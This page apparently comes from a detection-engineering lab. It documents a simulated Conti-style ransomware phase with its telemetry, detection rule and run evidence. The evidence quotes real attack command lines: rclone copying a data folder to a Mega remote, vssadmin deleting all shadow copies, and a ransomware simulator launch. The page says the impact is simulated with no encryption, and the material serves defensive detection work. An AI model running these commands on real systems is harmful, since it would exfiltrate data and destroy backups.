# Ransomware

| | |
|---|---|
| Chain phase | Ransomware |
| Account | SYSTEM |
| What happens | shadow copies deleted, data renamed and noted, system paths skipped |
| Telemetry | Sysmon 1, Sysmon 11 |
| Detection | R12 |
| Payload / tooling | ransomware-sim.c, ransomware-launcher.bat.tpl, ransom-note.txt |

## How the lab reproduces it

See [`attack-playbook/README.md`](../../../attack-playbook/README.md) for the ordered steps, the exact
commands and the checks after each step. Anything this phase writes is listed in
[`attack-playbook/payloads`](../../../attack-playbook/payloads/README.md).

## Evidence

<!-- Elastic capture for this phase: elastic-conti-ransomware.png -->
<!-- Manual capture for this phase: manual-conti-ransomware.png -->

Run 6, 2026-11-21, FS01, driven by `fs01-task.ps1` from the post-reboot beacon session.

| UTC | Event | Locator | Excerpt |
|---|---|---|---|
| 12:05:58.766 | E1 | `AaH9_-2TxY-KOnHLj1eE` | `"C:\ProgramData\rclone.exe" --config C:\ProgramData\rclone.conf copy C:\C0015\corpus Mega:DATA -q --ignore-existing --auto-confirm` |
| 12:06:00.760 | E1 | `AaH9_-2TxY-KOnHLj1ep` | `"C:\Windows\system32\vssadmin.exe" delete shadows /all /quiet` |
| 12:06:00.863 | E1 | `AaH9_-2TxY-KOnHLj1e_` | `"C:\ProgramData\ransomware-sim.exe" -m -net -size 10 -nomutex -p C:\C0015\corpus` |

`C:\ProgramData\fs01_task.log` (one JSON line per step):

```json
{"ts":"2026-11-21T12:06:00Z","step":"3","name":"exfil","status":"pass","observed":"exit=0; errors=0"}
{"ts":"2026-11-21T12:06:00Z","step":"4","name":"impact","status":"pass","observed":"exit=0; renamed=40; notes=4"}
{"ts":"2026-11-21T12:06:00Z","step":"done","name":"task","status":"pass","observed":"all steps verified"}
```

Impact is a simulation: 40 files renamed, four notes written, no encryption. The verifier checks the
counts before the task reports success.
